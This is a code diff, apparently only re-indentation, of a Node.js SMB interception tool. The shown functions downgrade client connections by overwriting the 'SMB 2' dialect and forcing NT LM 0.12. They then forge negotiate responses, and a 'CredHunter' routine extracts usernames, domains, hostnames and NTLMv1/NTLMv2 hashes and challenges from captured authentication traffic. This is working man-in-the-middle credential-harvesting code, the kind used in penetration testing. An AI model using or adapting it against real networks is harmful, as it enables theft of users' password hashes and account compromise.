@@ -104,11 +104,11 @@ function scrubSMB2(buffer) {
     var buf = buffer.slice(40, len);
     
     for(var i=40; i < len - 5; i++) {
-	    var test = buffer.toString("utf8", i, i+5);
-	    if(test == "SMB 2") {
-	        out.red("Scrubbing SMB2 dialect");
-	        buffer.write("BOGUS", i);
-	    }
+        var test = buffer.toString("utf8", i, i+5);
+        if(test == "SMB 2") {
+            out.red("Scrubbing SMB2 dialect");
+            buffer.write("BOGUS", i);
+        }
     }
 }
 
@@ -158,17 +158,17 @@ function SMBPacket(buffer) {
     }
     
     if(this.commandCode == 0x72) {
-	    var len       = buffer.readUInt16LE(37)+40-2;
-	    var diabuffer = buffer.slice(40, len).toString();
-	    var dialects  = diabuffer.split(/\x00\x02/);
-	    this.ntlmoffset = dialects.indexOf("NT LM 0.12"); 
-	    scrubSMB2(buffer);
+        var len       = buffer.readUInt16LE(37)+40-2;
+        var diabuffer = buffer.slice(40, len).toString();
+        var dialects  = diabuffer.split(/\x00\x02/);
+        this.ntlmoffset = dialects.indexOf("NT LM 0.12"); 
+        scrubSMB2(buffer);
 
-	    // out.red("NT LM 0.12 offset is " + this.ntlmoffset);
-	    // buffer.writeUInt16LE(12, 37);
-	    // buffer.writeUInt8(0x02, 39);
-	    // buffer.write("NT LM 0.12", 40);
-	    // buffer.writeUInt8(0x00, 50);
+        // out.red("NT LM 0.12 offset is " + this.ntlmoffset);
+        // buffer.writeUInt16LE(12, 37);
+        // buffer.writeUInt8(0x02, 39);
+        // buffer.write("NT LM 0.12", 40);
+        // buffer.writeUInt8(0x00, 50);
     }
 
     this.describe = function() {
@@ -183,63 +183,63 @@ function SMBPacket(buffer) {
     this.setAsAnswerTo = function(packet) {
         var processid = packet.buffer.readUInt16LE(30);
         var flags     = packet.buffer.readUInt8(13) | 0x80; // 0x80 makes it a "response"
-	    var flags2    = packet.buffer.readUInt16LE(14);
+        var flags2    = packet.buffer.readUInt16LE(14);
         var mid       = packet.buffer.readUInt16LE(34);
-	    var dlen      = packet.buffer.readUInt16LE(37);
+        var dlen      = packet.buffer.readUInt16LE(37);
 
         this.buffer.writeUInt8(flags, 13);
-	    this.buffer.writeUInt16LE(flags2, 14);
+        this.buffer.writeUInt16LE(flags2, 14);
         this.buffer.writeUInt16LE(processid, 30);
         this.buffer.writeUInt16LE(mid, 34);
 
-	    // If different clients specify different authentication dialects,
-	    // then we might end up with a mismatch.  In SMB_COM_NEGOTIATE
-	    // responses, we need to make sure we choose the same one.  In 
-	    // testing so far, they always seem to choose the last one.  This
-	    // may not always be the case, and could require enhancing in the
-	    // future.
+        // If different clients specify different authentication dialects,
+        // then we might end up with a mismatch.  In SMB_COM_NEGOTIATE
+        // responses, we need to make sure we choose the same one.  In 
+        // testing so far, they always seem to choose the last one.  This
+        // may not always be the case, and could require enhancing in the
+        // future.
 
-	    if(packet.commandCode == 0x72) {
+        if(packet.commandCode == 0x72) {
 
-	        // we add len to 40 (the offset for the dialect list), and then
-	        // subtract two because the two bytes used to specify the length
-	        // count.  In later NodeJS versions, the overrun is fine, but 
-	        // older versions throw an exception.
+            // we add len to 40 (the offset for the dialect list), and then
+            // subtract two because the two bytes used to specify the length
+            // count.  In later NodeJS versions, the overrun is fine, but 
+            // older versions throw an exception.
 
-	        var len       = packet.buffer.readUInt16LE(37)+40-2;
-	        var dialects  = packet.buffer.slice(40, len).toString();
-	        var lastd     = dialects.split(/\x00\x02/);
-	        //out.red("Patching dialect (" + (lastd.length-1) + ")");
-	        //this.buffer.writeUInt16LE(lastd.length-1, 37);
-	        out.red("Patching dialect (" + (packet.ntlmoffset) + ")");
-	        this.buffer.writeUInt16LE(packet.ntlmoffset, 37);
-	    }
+            var len       = packet.buffer.readUInt16LE(37)+40-2;
+            var dialects  = packet.buffer.slice(40, len).toString();
+            var lastd     = dialects.split(/\x00\x02/);
+            //out.red("Patching dialect (" + (lastd.length-1) + ")");
+            //this.buffer.writeUInt16LE(lastd.length-1, 37);
+            out.red("Patching dialect (" + (packet.ntlmoffset) + ")");
+            this.buffer.writeUInt16LE(packet.ntlmoffset, 37);
+        }
         return true;
     }        
 
     this.setAsAnswerToMod = function(packet, uid) {
         var processid = packet.buffer.readUInt16LE(30);
         var flags     = packet.buffer.readUInt8(13) | 0x80; // 0x80 makes it a "response"
-	    var flags2    = packet.buffer.readUInt16LE(14);
+        var flags2    = packet.buffer.readUInt16LE(14);
         var mid       = packet.buffer.readUInt16LE(34);
-	    var dlen      = packet.buffer.readUInt16LE(37);
+        var dlen      = packet.buffer.readUInt16LE(37);
 
         this.buffer.writeUInt8(flags, 13);
-	    this.buffer.writeUInt16LE(flags2, 14);
+        this.buffer.writeUInt16LE(flags2, 14);
         this.buffer.writeUInt16LE(processid, 30);
         this.buffer.writeUInt16LE(uid, 32);
         this.buffer.writeUInt16LE(mid, 34);
 
-	    if(packet.commandCode == 0x72) {
+        if(packet.commandCode == 0x72) {
 
-	        var len       = packet.buffer.readUInt16LE(37)+40-2;
-	        var dialects  = packet.buffer.slice(40, len).toString();
-	        var lastd     = dialects.split(/\x00\x02/);
-	        //out.red("Patching dialect (" + (lastd.length-1) + ")");
-	        //this.buffer.writeUInt16LE(lastd.length-1, 37);
-	        out.red("Patching dialect (" + (packet.ntlmoffset) + ")");
-	        this.buffer.writeUInt16LE(packet.ntlmoffset, 37);
-	    }
+            var len       = packet.buffer.readUInt16LE(37)+40-2;
+            var dialects  = packet.buffer.slice(40, len).toString();
+            var lastd     = dialects.split(/\x00\x02/);
+            //out.red("Patching dialect (" + (lastd.length-1) + ")");
+            //this.buffer.writeUInt16LE(lastd.length-1, 37);
+            out.red("Patching dialect (" + (packet.ntlmoffset) + ")");
+            this.buffer.writeUInt16LE(packet.ntlmoffset, 37);
+        }
         return true;
     }
 
@@ -256,39 +256,39 @@ function CredHunter(packet) {
     this.htype = "unknown";
     this.ntlmssp  = false;
     try {
-	    var header  = packet.slice(4,36);
-	    var bloblen = packet.readUInt16LE(36+15);
-	    var secblob = packet.slice(36+27, 36+27+bloblen);
+        var header  = packet.slice(4,36);
+        var bloblen = packet.readUInt16LE(36+15);
+        var secblob = packet.slice(36+27, 36+27+bloblen);
         
-	    // NTLMSSP
-	    for(var i = 0; i < secblob.length - 7; i++) {
-	        if(secblob.toString('utf8', i, i+7) == "NTLMSSP") {
-	    	    this.ntlmssp = true;
-	    	    this.ntlmssp_offset = i + 4 + 36 + 27;
-	    	    var authtype = secblob.readUInt32LE(i+8);
-	    	    if(authtype == 3) {
-	    	        var lmlen = secblob.readUInt16LE(i+12);
-	    	        var lmoff = secblob.readUInt32LE(i+16);
-	    	        var ntlmlen = secblob.readUInt16LE(i+20);
-	    	        var ntlmoff = secblob.readUInt32LE(i+24);
-	    	        var domlen = secblob.readUInt16LE(i+28);
-	    	        var domoff = secblob.readUInt32LE(i+32);
-	    	        var userlen = secblob.readUInt16LE(i+36);
-	    	        var useroff = secblob.readUInt32LE(i+40);
-	    	        var hostlen = secblob.readUInt16LE(i+44);
-	    	        var hostoff = secblob.readUInt32LE(i+48);
+        // NTLMSSP
+        for(var i = 0; i < secblob.length - 7; i++) {
+            if(secblob.toString('utf8', i, i+7) == "NTLMSSP") {
+                this.ntlmssp = true;
+                this.ntlmssp_offset = i + 4 + 36 + 27;
+                var authtype = secblob.readUInt32LE(i+8);
+                if(authtype == 3) {
+                    var lmlen = secblob.readUInt16LE(i+12);
+                    var lmoff = secblob.readUInt32LE(i+16);
+                    var ntlmlen = secblob.readUInt16LE(i+20);
+                    var ntlmoff = secblob.readUInt32LE(i+24);
+                    var domlen = secblob.readUInt16LE(i+28);
+                    var domoff = secblob.readUInt32LE(i+32);
+                    var userlen = secblob.readUInt16LE(i+36);
+                    var useroff = secblob.readUInt32LE(i+40);
+                    var hostlen = secblob.readUInt16LE(i+44);
+                    var hostoff = secblob.readUInt32LE(i+48);
                     var win_major_ver = secblob.readUInt8(i+64);
                     var win_minor_ver = secblob.readUInt8(i+65);
                     var win_build_ver = secblob.readUInt16LE(i+66);
 
-	    	        var username = secblob.toString('utf8', i+useroff, i+useroff+userlen);
+                    var username = secblob.toString('utf8', i+useroff, i+useroff+userlen);
                     var lmhash = secblob.toString('hex', i+lmoff, i+lmoff+lmlen);
                     var nthash = secblob.toString('hex', i+ntlmoff, i+ntlmoff+ntlmlen);
 
                     // we must remove the null bytes in the domain and username
-	    	        this.domain = secblob.toString('utf8', i+domoff, i+domoff+domlen).replace(/\0/g, '');
-	    	        this.username = secblob.toString('utf8', i+useroff, i+useroff+userlen).replace(/\0/g, '');
-	    	        this.hostname = secblob.toString('utf8', i+hostoff, i+hostoff+hostlen);
+                    this.domain = secblob.toString('utf8', i+domoff, i+domoff+domlen).replace(/\0/g, '');
+                    this.username = secblob.toString('utf8', i+useroff, i+useroff+userlen).replace(/\0/g, '');
+                    this.hostname = secblob.toString('utf8', i+hostoff, i+hostoff+hostlen);
                     this.winver = "Windows " + win_major_ver + "." + win_minor_ver + " (Build " + win_build_ver + ")"
 
                     if(ntlmlen == 24) {
@@ -300,11 +300,11 @@ function CredHunter(packet) {
                         this.hash = nthash.slice(0,32) + ":" + nthash.slice(32);
                         this.htype = "NTLMv2";
                     }
-	    	    } else if(authtype == 2) {
+                } else if(authtype == 2) {
                     this.challenge = secblob.toString('hex', i+24, i+32);
-	    	    }
-	        }
-	    }
+                }
+            }
+        }
     } catch(e) {
     }
 }
